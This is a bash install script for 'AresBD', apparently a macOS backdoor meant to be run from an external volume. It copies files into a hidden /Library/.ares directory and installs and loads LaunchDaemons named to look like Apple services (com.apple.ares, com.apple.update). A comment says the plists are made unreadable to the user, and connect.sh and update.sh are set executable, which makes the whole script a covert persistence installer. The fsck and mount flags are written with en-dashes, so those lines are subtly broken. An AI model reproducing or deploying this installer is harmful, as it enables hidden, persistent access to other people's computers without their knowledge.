#!/bin/bash

#  install.sh
#  AresBD
#
#  Copyright (c) 2015 Stsosz Systems. All rights reserved.
#  Don't be an asshole. Don't use this without permission. I'm not responsible for
#  Any stupid stuff you do with AresBD.

echo -e "Running a filesystem check... \c"
fsck –fy
echo "Done."

echo -e "Mounting filesystem with read-write access... \c"
mount –uw /
echo "Done"

echo -e "Creating directories... \c"
mkdir -vp /Library/.ares
mkdir -vp /Library/LaunchDaemons
echo -e "Done."

cp -v /Volumes/Ares/ares-hidden/* /Library/.ares

cp -v /Volumes/Ares/LaunchDaemons/* /Library/LaunchDaemons

echo -e "Making everything executable... \c"
chmod +x /Library/.ares/connect.sh
chmod +x /Library/.ares/update.sh
echo "Done"
echo ""

echo -e "Making sure that the user cannot read plists... \c"
chmod 600 /Library/LaunchDaemons/com.apple.ares.plist
chmod 600 /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo -e "Loading plists into LaunchCTL \c"
launchctl load /Library/LaunchDaemons/com.apple.ares.plist
launchctl load /Library/LaunchDaemons/com.apple.update.plist
echo "Done."
echo ""

echo "Install Complete."
echo ""

echo "Press enter to shut down..."
read shutdown

echo "Shutting down..."
shutdown -h now